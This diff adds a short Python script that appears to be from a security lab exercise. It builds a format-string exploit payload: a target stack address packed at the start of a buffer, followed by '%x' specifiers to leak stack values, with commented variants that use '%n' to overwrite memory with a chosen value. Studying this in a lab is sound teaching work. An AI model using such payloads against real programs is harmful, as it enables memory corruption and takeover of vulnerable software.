@@ -1,0 +1,22 @@
+#!/usr/bin/python3
+
+import sys
+
+N = 1200
+content = bytearray(0x0 for i in range(N))
+
+# Put the address at the beginning
+addr = 0xbfffebd4
+content[0:4] = (addr).to_bytes(4,byteorder='little')
+
+###################################################
+# Add the format specifiers
+# Investigation
+s = "%x_"*6 + "\n"
+
+# Modify memory (any value)
+# s = "%x_"*5 + %n" + "\n"
+
+# Modify memory (with specific value)
+# D = 0x00778899 - 12 - 8*4
+# s = "%.8x"*4 + "%." + str(D) + "x" + "%n" + "\n"
